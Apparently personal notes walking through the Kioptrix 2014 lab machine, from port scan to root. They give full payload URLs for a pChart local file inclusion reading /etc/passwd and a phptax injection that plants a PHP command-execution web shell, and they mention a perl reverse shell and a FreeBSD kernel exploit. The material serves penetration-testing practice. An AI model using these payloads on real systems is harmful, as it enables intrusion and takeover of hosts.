<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>kioptrix 2014</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>kioptrix 2014</h1><br/>normal nmap and found 22,80,8080<br />kicked off TireFire for 80 and 8080<br />few results and no web app. <br />8080 was forbidden<br />80 I could only see the main page saying that it works.<br />In the page source I could see pChart2.1.3.<br />searchsploit showed me a LFI dir<br /><a href="http://192.168.11.138/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd">http://192.168.11.138/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</a><br />from here I tried my list of lfi files of interest and found /usr/local/etc/apache22/httpd.conf<br />at the bottom of this conf page it said that 8080 would deny any user-agent other than Mozilla/4.0<br />So I fired up RESTer and looked at the main pagkeotrix 2014e with the custom user agent and it worked!<br />I could see that it was running phptax.<br />searchsploit showed me a LFI for remote code execution<br />http://192.168.11.138:8080/phptax/index.php?field=rce.php&amp;newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E<br /><a href="http://192.168.11.138:8080/phptax/data/rce.php?cmd=id">http://192.168.11.138:8080/phptax/data/rce.php?cmd=id</a><br />when I saw that I could run commands I tried to get a reverse shell.<br />nc, python, and php would not work, but perl DID!<br />^^^BTW all of these commands needed to be urlencoded<br />now that I have a shell I went to /etc/shells and used /bin/tcsh<br />fixed with python<br />uname -a showed that it was running freebsd 9.0<br />searchsploit showed me that there was an exploit specifically for this.<br />scp 26368.c over and then gcc 26368.c<br />run the new file and rooted!!<br /><br /><br /></div></body></html>